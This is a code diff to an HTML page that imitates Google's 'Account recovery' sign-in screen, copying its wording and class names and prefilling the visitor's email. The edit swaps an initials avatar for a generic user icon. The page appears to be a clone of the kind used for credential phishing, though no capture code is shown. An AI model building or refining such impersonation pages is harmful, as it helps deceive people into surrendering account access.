@@ -126,6 +126,13 @@
     text-decoration: none; border-radius: 8px;
   }
   .AVAq4d:hover { background: rgba(227,227,227,.08); }
+
+  .avatar-user {
+    width: 24px; height: 24px; border-radius: 50%; margin-right: 8px;
+    display: inline-flex; align-items: center; justify-content: center;
+    background: rgb(95,99,104); color: #fff; overflow: hidden;
+  }
+  .avatar-user svg { width: 20px; height: 20px; display: block; }
 </style>
 </head>
 <body class="AfoeCd" data-ux-next="">
@@ -142,7 +149,7 @@
           <h1 class="title">Account recovery</h1>
           <p class="lead">To help keep your account safe, Google wants to make sure it’s really you trying to sign in</p>
           <button type="button" class="chip" id="chip">
-            <span class="avatar" id="avatar" data-ux-avatar="2" data-ux-initials>?</span>
+            <span class="avatar-user" aria-hidden="true"><svg aria-hidden="true" fill="currentColor" focusable="false" width="20" height="20" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg></span>
             <span class="chip-email" data-ux-email data-profile-identifier>Account</span>
             <svg class="caret" viewBox="0 0 24 24" aria-hidden="true"><path d="M7 9.5l5 5 5-5H7z"/></svg>
           </button>
@@ -219,8 +226,6 @@
       if (!email) return;
       var emailEl = document.querySelector('[data-ux-email]');
       if (emailEl) emailEl.textContent = email;
-      var av = document.getElementById('avatar');
-      if (av) { av.textContent = initials(email); av.style.background = avatarColor(email); }
       var chip = document.getElementById('chip');
       if (chip) chip.setAttribute('aria-label', email + ' selected. Switch account');
     }
